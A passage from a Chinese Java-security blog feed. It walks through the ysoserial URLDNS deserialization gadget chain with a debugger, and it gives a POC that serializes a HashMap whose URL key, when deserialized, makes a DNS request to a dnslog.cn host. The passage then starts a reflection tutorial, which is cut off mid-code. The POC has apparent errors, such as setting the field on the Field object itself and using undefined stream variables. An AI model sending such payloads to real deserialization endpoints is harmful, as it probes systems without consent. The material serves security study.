handler = new SilentURLStreamHandler();</code><br>这次调用的子类<code>SilentURLStreamHandler</code>方法，去规避生成序列化的过程中触发dns，因为调用子类在获取<code>getHostAddress</code>方法时返回<code>Null</code>,并不执行父类<code>URLStreamHandler</code>中的<code>getHostAddress()</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>生成<code>URL对象</code>，并将<code>url参数</code>和<code>URLStreamHandler</code>传入<code>URL对象</code>中</p><p><img src="/posts/643c7e53/url-14.png" title="建立对象"></p><p>随后执行<code>HashMap</code>的<code>put()</code>方法,将<code>URL对象</code>作为<code>HashMap值</code>，将<code>url参数值</code>作为<code>key的值</code>存储在<code>HashMap</code>中<br><code>ht.put(u, url);</code><br>再通过反射机制将<code>URL对象</code>的<code>hashCode值</code>设置为-1<br><code>Reflections.setFieldValue(u, &quot;hashCode&quot;, -1);</code></p><p><img src="/posts/643c7e53/url-15.png" title="调用反射机制"></p><p>最后返回HashMap对象ht</p><p><img src="/posts/643c7e53/url-16.png" title="返回HashMap对象"></p><p>在获取HashMap对象后对其进行序列化操作，这边没有设置out定向输出的文件，out就没对应数值,对应命令行最后加<code> &gt; serialize.ser</code>。</p><p><img src="/posts/643c7e53/url-17.png" title="序列化操作"></p><p>由于<code>HashMap</code>对序列化<code>writeObject()</code>也进行了重写，所以会调用<code>HashMap</code>的序列化方法进行序列化操作，正常的序列化操作。</p><p><img src="/posts/643c7e53/url-18.png" title="序列化操作"></p><p>遍历<code>HashMap</code>中<code>key</code>和<code>value</code>进行序列化写入</p><p><img src="/posts/643c7e53/url-19.png" title="序列化操作"></p><p>到此ysoserial工具的URLDNS利用链就执行完成，输出payload序列化的数据。</p><p><img src="/posts/643c7e53/url-20.png" title="生成序列化文件"></p><h2 id="yso-URLDNS链反序列化"><a href="#yso-URLDNS链反序列化" class="headerlink" title="yso-URLDNS链反序列化"></a>yso-URLDNS链反序列化</h2><p>通过对输出的序列化数据，进行反序列化，触发漏洞。</p><p><img src="/posts/643c7e53/url-21.png" title="反序列化触发漏洞"><br><img src="/posts/643c7e53/url-22.png" title="DNSLOG接受到数据"></p><p><strong>payload</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Payload</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream obj=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;C:\\Users\\OKAY\\Desktop\\java-web\\ysoserial\\payload.ser&quot;</span>));</span><br><span class="line">        obj.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x03、URLDNS链反序列化分析"><a href="#0x03、URLDNS链反序列化分析" class="headerlink" title="0x03、URLDNS链反序列化分析"></a>0x03、URLDNS链反序列化分析</h1><h2 id="正常反序列化readObject阶段"><a href="#正常反序列化readObject阶段" class="headerlink" title="正常反序列化readObject阶段"></a>正常反序列化readObject阶段</h2><p>这里就跟着payload的反序列化进行分析下去吧，（当然也可以直接在HashMap重写的readObject方法进行下断点，可以直接分析反序列化触发的漏洞），这里从头来可以理解一下运行流程，但前些正常的反序列化过程比较长有些就略过了，记录下关键的步入点吧。<br>反序列化处下断点，debug运行</p><p><img src="/posts/643c7e53/url-30.png" title="下断点"></p><p>运行后，需要强行步入（Alt+Shift+F7）readObject方法，注：步入会直接跳过<br>进入后，还需要再次强行步入进入readObject方法</p><p><img src="/posts/643c7e53/url-31.png" title="readObject方法"></p><p>进入后，前面都是正常的一些判断，步过直到调用<code>readObject0()</code>方法</p><p><img src="/posts/643c7e53/url-31.png" title="readObject0方法"><br><img src="/posts/643c7e53/url-32.png" title="readObject0方法"></p><p>进入readObject0()方法，然后又是一系列的正常操作和判断，再关注到TC的判断如下图，由于TC为Obeject对象，并非String类对象，所以判断为false，进入调用readOrdinaryObject方法（读取二进制数据）</p><p><img src="/posts/643c7e53/url-33.png" title="readObject0方法"></p><p>进入readOrdinaryObject方法，这里读取序列化数据，并将序列化数据赋值给对象</p><p><img src="/posts/643c7e53/url-34.png" title="readOrdinaryObject方法"></p><p>后面将对象进行实例化并进行一些判断操作，一直到进入<code>readSerialData</code>方法</p><p><img src="/posts/643c7e53/url-35.png" title="readOrdinaryObject方法"><br><img src="/posts/643c7e53/url-36.png" title="readSerialData方法"></p><p><code>readSerialData</code>方法对序列化数据进行读取，一直到调用<code>invokeReadObject</code>方法</p><p><img src="/posts/643c7e53/url-38.png" title="invokeReadObject方法"></p><p>通过反射invoke去判断对象是否有重写readObject方法</p><p><img src="/posts/643c7e53/url-39.png" title="invokeReadObject方法"><br><img src="/posts/643c7e53/url-40.png" title="invokeReadObject方法"></p><p>返回<code>ma.invoke</code>，跟进查看<code>ma.invoke</code></p><p><img src="/posts/643c7e53/url-41.png" title="invokeReadObject方法"></p><p>返回<code>delegate.invoke</code>,跟进<code>delegate.invoke</code>方法</p><p><img src="/posts/643c7e53/url-42.png" title="invokeReadObject方法"></p><p>获得返回<code>HashMap</code>重写的<code>readObject</code>方法</p><p><img src="/posts/643c7e53/url-43.png" title="invokeReadObject方法"></p><p>跟进返回的<code>invoke0</code>,便进入调用的<code>HashMap</code>重写的<code>readObject</code>方法<br>到这里，进入<code>HashMap</code>重写的<code>readObject()</code>方法</p><p><img src="/posts/643c7e53/url-23.png" title="重写的readObject()方法"></p><h2 id="HashMap反序列化readObject阶段"><a href="#HashMap反序列化readObject阶段" class="headerlink" title="HashMap反序列化readObject阶段"></a>HashMap反序列化readObject阶段</h2><p>遍历<code>HashMap</code>中<code>key</code>和<code>value</code>的值，并反序列化读取还原<code>key</code>和<code>value</code>的值，随后进行<code>hash()</code>运算保证唯一</p><p><img src="/posts/643c7e53/url-24.png" title="获取key和value值"></p><p>跟进<code>hash()</code>,hash方法判断key是否为空，不为空就调用<code>URL</code>类中的<code>hashcode()</code>方法，key值为url如下图标识所示</p><p><img src="/posts/643c7e53/url-25.png" title="hash()方法"></p><p>跟进当前<code>hashcode()</code>方法，会首先判断hashcode是否为-1,为-1则进入<code>URLStreamHandler流对象的hashcode()</code>方法</p><p><img src="/posts/643c7e53/url-26.png" title="hashcode()方法"></p><p>流对象的<code>hashcode()</code>调用了<code>getHostAddress()</code>方法</p><p><img src="/posts/643c7e53/url-27.png" title="hashcode()方法"></p><p>跟进<code>getHostAddress()</code>方法，返回URL类的<code>u.getHostAddress()</code>方法</p><p><img src="/posts/643c7e53/url-28.png" title="getHostAddress()"></p><p>跟进<code>u.getHostAddress()</code>方法，调用<code>getByName()</code>从而解析请求dnslog，导致漏洞触发。</p><p><img src="/posts/643c7e53/url-44.png" title="dnslog请求"><br><img src="/posts/643c7e53/url-29.png" title="dnslog请求"></p><p>到此URLDNS链的反序列化触发访问dnslog就完成。</p><h2 id="总结URLDNS反序列化链流程"><a href="#总结URLDNS反序列化链流程" class="headerlink" title="总结URLDNS反序列化链流程"></a>总结URLDNS反序列化链流程</h2><ol><li><code>ObjectInputStream</code>读取<code>HashMap</code>的序列化文件</li><li>通过正常<code>Object</code>流<code>readObject</code>反序列化文件获取二进制数据</li><li>对二进制序列化数据进行读取并建立实例对象</li><li>通过对实例对象判断是否存在重写方法</li><li>获取到<code>HashMap</code>对象重写反序列化<code>readObject</code>方法，跳转执行该对象的<code>readObject</code>方法。</li><li>遍历序列化<code>Key</code>和<code>value</code>值，进行<code>hash</code>运算</li><li><code>hash</code>方法中<code>key</code>不为空时，调用<code>URL</code>类的<code>hashcode</code>方法</li><li>当<code>hashcode</code>等于-1时，调用<code>URLStreamHandler</code>流的<code>hashcode</code>方法</li><li><code>hashcode</code>方法中调用了<code>getHostAddress()</code>方法</li><li><code>getHostAddress()</code>方法返回<code>URL</code>类的<code>u.getHostAddress()</code>,</li><li><code>URL</code>类的<code>getHostAddress()</code>方法调用<code>getByName()</code>方法从而解析请求dns</li></ol><p><strong>其中步骤1-5为正常反序列化的读取步骤，6-11为获取HashMap对象执行重写readObject方法步骤。</strong></p><h1 id="0x04、POC编写"><a href="#0x04、POC编写" class="headerlink" title="0x04、POC编写"></a>0x04、POC编写</h1><p>通过上述过程可以理出来代码重要步骤。<br>主要生成HashMap对象和URL对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">URL u=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://yuk9sy.dnslog.cn&quot;</span>);</span><br></pre></td></tr></table></figure><p>并通过反射控制URL类中hashcode的值</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">code</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashcode&quot;</span>);  <span class="comment">//通过反射去控制hashcode值</span></span><br><span class="line">       code.setAccessible(<span class="literal">true</span>); <span class="comment">//突破封装访问私有变量</span></span><br></pre></td></tr></table></figure><p>放入hashMap put值</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">hm.put(u,<span class="number">123</span>);  <span class="comment">//设置HashMap键值对</span></span><br></pre></td></tr></table></figure><p>通过设置hashcode为-1去触发dns请求</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">code.set(code,-<span class="number">1</span>);  <span class="comment">//通过设置hashcode为-1去触发dns请求</span></span><br></pre></td></tr></table></figure><p>然后就是序列化HashMap对象，最后反序列化。<br>完整POC：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        HashMap hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">//创建HashMap对象</span></span><br><span class="line">        URL u=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://yuk9sy.dnslog.cn&quot;</span>); <span class="comment">//创建URL对象</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">code</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashcode&quot;</span>);  <span class="comment">//通过反射去控制hashcode值</span></span><br><span class="line">        code.setAccessible(<span class="literal">true</span>); <span class="comment">//突破封装访问私有变量</span></span><br><span class="line">        code.set(code,<span class="number">1</span>); <span class="comment">//将hashcode设置不为-1，避免在序列化生成过程触发dns</span></span><br><span class="line">        hm.put(u,<span class="number">123</span>);  <span class="comment">//设置HashMap键值对</span></span><br><span class="line">        code.set(code,-<span class="number">1</span>); <span class="comment">//将hashcode值设置为-1 , 确保在反序列化的时候触发dns</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//序列化过程</span></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hm);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//反序列化过程</span></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">            fileInputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x05、参考链接"><a href="#0x05、参考链接" class="headerlink" title="0x05、参考链接"></a>0x05、参考链接</h1><p><a href="https://mp.weixin.qq.com/s/MiBpBHRUkJbEwTcERgEx5w">https://mp.weixin.qq.com/s/MiBpBHRUkJbEwTcERgEx5w</a><br><a href="https://paper.seebug.org/1242/#commons-collections">https://paper.seebug.org/1242/#commons-collections</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-初识java反射</title>
      <link href="/posts/7a787d86.html"/>
      <url>/posts/7a787d86.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>学习java基础知识记录，方便查阅。</p><h1 id="0x01、反射基础"><a href="#0x01、反射基础" class="headerlink" title="0x01、反射基础"></a>0x01、反射基础</h1><h2 id="一、反射概念"><a href="#一、反射概念" class="headerlink" title="一、反射概念"></a>一、反射概念</h2><blockquote><p>java执行分为<font color="red">编译期</font>和<font color="red">运行期</font><br><font color="red">编译期</font>是指把源码交给编译器编译成计算机可以执行的文件的过程。在 Java 中也就是把 Java 代码编成 class 文件的过程。编译期只是做了一些翻译功能，并没有把代码放在内存中运行起来，而只是把代码当成文本进行操作，比如检查错误。</p><p><font color="red">运行期</font>是把编译后的文件交给计算机执行，直到程序运行结束。所谓运行期就把在磁盘中的代码放到内存中执行起来。</p></blockquote><p>Java 反射机制是在<font color="red">运行状态</font>中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能称为 Java 语言的反射机制。简单来说，反射机制指的是程序在运行时能够获取自身的信息。在 Java 中，只要给定类的名字，就可以通过反射机制来获得类的所有信息。</p><p><strong>Java 反射机制主要提供了以下功能，这些功能都位于<code>java.lang.reflect</code>包。</strong></p><ul><li>在运行时判断任意一个对象所属的类。</li><li>在运行时构造任意一个类的对象。</li><li>在运行时判断任意一个类所具有的成员变量和方法。</li><li>在运行时调用任意一个对象的方法。</li><li>生成动态代理。</li></ul><p><strong>反射与常用引用类对象区别</strong><br>正常方式：引入对应的包类名称——&gt;通过new实例化——&gt;获取实例化对象</p><p><img src="/posts/7a787d86/jc-1.png" title="正常实现"></p><p>反射方式：实例化类对象——&gt;Class获取方法——&gt;得到完整的包类名称</p><p><img src="/posts/7a787d86/jc-4.png" title="反射实现"></p><p><strong>Java反射机制的优缺点</strong><br>优点：</p><ul><li>能够运行时<font color="red">动态获取类的实例</font>，大大提高系统的<font color="red">灵活性</font>和<font color="red">扩展性</font>。</li><li>与Java动态编译相结合，可以实现无比强大的功能。</li><li>降低代码程序之间的依赖性。</li><li>对于Java这种先编译再运行的语言，能够让我们很方便的创建灵活的代码，这些代码可以在运行时装配，无需在组件之间进行源代码的链接，更加容易实现面向对象。</li></ul><p>缺点：</p><ul><li>反射会<font color="red">消耗一定的系统资源</font>，因此，如果不需要动态地创建一个对象，那么就不需要用反射；</li><li>冗余了很多代码量。</li><li>反射调用方法时可以忽略权限检查，获取这个类的私有方法和属性，因此可能会破坏类的封装性而导致安全问题。</li></ul><h2 id="二、反射实现"><a href="#二、反射实现" class="headerlink" title="二、反射实现"></a>二、反射实现</h2><h3 id="1、总结简述"><a href="#1、总结简述" class="headerlink" title="1、总结简述"></a>1、总结简述</h3><font color="red"><p><strong>1、通过Class类获取类。</strong><br><strong>2、通过newInstance()对类进行实例化。</strong><br><strong>3、通过Field访问成员变量|通过Method访问成员方法|通过Constructor访问成员构造方法</strong></p></font><p>注：如果实例类存在构造方法，newInstance()实例化必须保证实例类存在无参构造方法，如只有有参构造方法，newInstance()会报错。Java9以后推荐用clazz.getDeclaredConstructor().newInstance()方式即获取构造方法后再实例化，而非直接newInstance()。</p><p><strong>反射机制重要的类</strong></p><table><thead><tr><th align="center">类</th><th align="left">含义</th></tr></thead><tbody><tr><td align="center">java.lang.Class</td><td align="left">代表整个字节码。代表一个类型，代表整个类。</td></tr><tr><td align="center">java.lang.reflect.Method</td><td align="left">代表字节码中的方法字节码。代表类中的方法。</td></tr><tr><td align="center">java.lang.reflect.Constructor</td><td align="left">代表字节码中的构造方法字节码。代表类中的构造方法（方法名同类名相同且无参的方法）。</td></tr><tr><td align="center">java.lang.reflect.Field</td><td align="left">代表字节码中的属性字节码。代表类中的成员变量（静态变量+实例变量）。</td></tr></tbody></table><p><font color="red">必须通过Class获取类过后才能获取Method、Constructor、Field</font><br>也就是说Class是反射实现的前提。且Class并不是new出来的，而是java内置的。</p><h3 id="2、Class访问类"><a href="#2、Class访问类" class="headerlink" title="2、Class访问类"></a>2、Class访问类</h3><p><strong>Class获取方式</strong></p><table><thead><tr><th align="center">方式</th><th align="center">示例注解</th></tr></thead><tbody><tr><td align="center">Class.forName(“完整类名带包名”)</td><td align="center">Class A&#x3D;Class.forName(“com.java.reflect.people”);</td></tr><tr><td align="center">对象.getClass()</td><td align="center">people peo&#x3D;new people();Class A&#x3D;peo.getClass();</td></tr><tr><td align="center">任何类型.class</td><td align="center">Class A &#x3D; String.class;</td></tr></tbody></table><p><strong>反射类可访问的常用方法</strong></p><p><img src="/posts/7a787d86/jc-2.png" title="常用方法"></p><p><strong>代码实现</strong><br>people类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">people</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String phone;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reflect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//1、使用反射.forName(&quot;完整类名&quot;)获取类</span></span><br><span class="line">        Class people1=Class.forName(<span class="string">&quot;com.javaweb.reflect.people&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;使用.forName(\&quot;完整类名\&quot;)获取类 的类名&quot;</span>+people1.getName());</span><br><span class="line">        <span class="comment">//2、使用反射 对象.getClass()获取类</span></span><br><span class="line">        people pl=<span class="keyword">new</span> <span class="title class_">people</span>();</span><br><span class="line">        Class people2=pl.getClass();</span><br><span class="line">        System.out.println(<span class="string">&quot;使用对象.getClass()获取类 的类名&quot;</span>+people2.getName());</span><br><span class="line">        <span class="comment">//3、使用反射 任何类型.class获取类</span></span><br><span class="line">        Class people3=String.class;</span><br><span class="line">        System.out.println(<span class="string">&quot;使用任何类型.class获取类 的类名&quot;</span>+people3.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>三种获取类的实现截图：</p><p><img src="/posts/7a787d86/jc-4.png" title="Class类获取"></p><h3 id="2、Field访问成员变量"><a href="#2、Field访问成员变量" class="headerlink" title="2、Field访问成员变量"></a>2、Field访问成员变量</h3><p>通过下列任意一个方法访问成员变量时将返回 Field 类型的对象或数组。<br><strong>Field声明使用的方法</strong></p><table><thead><tr><th align="center">Field声明时的方法</th><th align="center">注解</th></tr></thead><tbody><tr><td align="center">getFields()</td><td align="center">获取所有权限为public的成员变量</td></tr><tr><td align="center">getField(String name)</td><td align="center">获取变量名为name的成员变量</td></tr><tr><td align="center">getDeclaredFields()</td><td align="center">获取当前对象的所有成员变量</td></tr><tr><td align="center">getDeclaredField(String name)</td><td align="center">获取变量名为name的成员变量</td></tr></tbody></table><p>注：针对private私有的变量，需要使用<code>setAccessible(true)</code>方法打破封装，访问私有变量</p><p><strong>Field常用方法</strong></p><table><thead><tr><th align="center">方法名称</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">getName()</td><td align="left">获得该成员变量的名称</td></tr><tr><td align="center">getType()</td><td align="left">获取表示该成员变量的 Class 对象</td></tr><tr><td align="center">get(Object obj)</td><td align="left">获得指定对象 obj 中成员变量的值，返回值为 Object 类型</td></tr><tr><td align="center">set(Object obj, Object value)</td><td align="left">将指定对象 obj 中成员变量的值设置为 value</td></tr><tr><td align="center">getlnt(0bject obj)</td><td align="left">获得指定对象 obj 中成员类型为 int 的成员变量的值</td></tr><tr><td align="center">setlnt(0bject obj, int i)</td><td align="left">将指定对象 obj 中成员变量的值设置为 i</td></tr><tr><td align="center">setFloat(Object obj, float f)</td><td align="left">将指定对象 obj 中成员变量的值设置为 f</td></tr><tr><td align="center">getBoolean(Object obj)</td><td align="left">获得指定对象 obj 中成员类型为 boolean 的成员变量的值</td></tr><tr><td align="center">setBoolean(Object obj, boolean b)</td><td align="left">将指定对象 obj 中成员变量的值设置为 b</td></tr><tr><td align="center">getFloat(Object obj)</td><td align="left">获得指定对象 obj 中成员类型为 float 的成员变量的值</td></tr><tr><td align="center">setAccessible(boolean flag)</td><td align="left">此方法可以设置是否忽略权限直接访问 private 等私有权限的成员变量</td></tr><tr><td align="center">getModifiers()</td><td align="left">获得可以解析出该方法所采用修饰符的整数</td></tr></tbody></table><p><strong>代码实现</strong><br>people类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">people</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String phone;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reflect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//三种获取类的方式</span></span><br><span class="line">        <span class="comment">//1、使用反射.forName(&quot;完整类名&quot;)获取类</span></span><br><span class="line">        Class people1=Class.forName(<span class="string">&quot;com.javaweb.reflect.people&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;使用.forName(\&quot;完整类名\&quot;)获取类 的类名&quot;</span>+people1.getName());</span><br><span class="line">        <span class="comment">//2、使用反射 对象.getClass()获取类</span></span><br><span class="line">        people pl=<span class="keyword">new</span> <span class="title class_">people</span>();</span><br><span class="line">        Class people2=pl.getClass();</span><br><span class="line">        System.out.println(<span class="string">&quot;使用对象.getClass()获取类 的类名&quot;</span>+people2.getName());</span><br><span class="line">        <span class="comment">//3、使用反射 任何类型.class获取类</span></span><br><span class="line">        Class people3=String.class;</span><br><span class="line">        System.out.println(<span class="string">&quot;使用任何类型.class获取类 的类名&quot;</span>+people3.getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//进行反射类实例化</span></span><br><span class="line">        Object obj=people1.newInstance();</span><br><span class="line">        <span class="comment">//System.out.println(obj);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//Field访问成员变量</span></span><br><span class="line">        <span class="comment">//反射获取类变量</span></span><br><span class="line">        Field A=people1.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="comment">//由于people类属性值为private私有的，需要setAccessible(true)打破封装，访问私有变量。</span></span><br><span class="line">        A.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//反射设置类中的变量值</span></span><br><span class="line">        A.set(obj,<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        <span class="comment">//输出该obj对象中变量的变量值</span></span><br><span class="line">        System.out.println(A.get(obj));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Field实现截图：</p><p><img src="/posts/7a787d86/jc-5.png" title="Field实现"></p><h3 id="3、Method访问成员方法"><a href="#3、Method访问成员方法" class="headerlink" title="3、Method访问成员方法"></a>3、Method访问成员方法</h3><p>要动态获取一个对象方法的信息，首先需要通过下列方法之一创建一个<code>Method</code>类型的对象或者数组。<br><strong>Method声明使用的方法</strong></p><table><thead><tr><th align="center">Method声明使用的方法</th><th align="left">注解</th></tr></thead><tbody><tr><td align="center">getMethods()</td><td align="left">获取所有权限为public的成员方法</td></tr><tr><td align="center">getMethods(String name,Class&lt;?&gt; …parameterTypes)</td><td align="left">获取方法名为name的成员方法，参数类型在方法名逗号后面,没有形参就不传</td></tr><tr><td align="center">getDeclaredMethods()</td><td align="left">获取的成员所有的方法</td></tr><tr><td align="center">getDeclaredMethods(String name,Class&lt;?&gt;…parameterTypes)</td><td align="left">获取方法名为name的成员方法，参数类型在方法名逗号后面,没有形参就不传</td></tr></tbody></table><p>注：针对private私有的方法，需要使用<code>setAccessible(true)</code>方法打破封装，访问私有方法</p><p><strong>Method常用方法</strong></p><table><thead><tr><th align="center">静态方法名称</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">getName()</td><td align="left">获取该方法的名称</td></tr><tr><td align="center">getParameterType()</td><td align="left">按照声明顺序以 Class 数组的形式返回该方法各个参数的类型</td></tr><tr><td align="center">getReturnType()</td><td align="left">以 Class 对象的形式获得该方法的返回值类型</td></tr><tr><td align="center">getExceptionTypes()</td><td align="left">以 Class 数组的形式获得该方法可能抛出的异常类型</td></tr><tr><td align="center">invoke(Object obj,Object…args)</td><td align="left">利用 args 参数执行指定对象 obj 中的该方法，返回值为 Object 类型</td></tr><tr><td align="center">isVarArgs()</td><td align="left">查看该方法是否允许带有可变数量的参数，如果允许返回 true，否则返回 false</td></tr><tr><td align="center">getModifiers()</td><td align="left">获得可以解析出该方法所采用修饰符的整数</td></tr></tbody></table><p><strong>代码实现</strong><br>people类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaweb.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">people</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String phone;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setinfo</span><span class="params">(String name,String phone,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.phone=phone;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    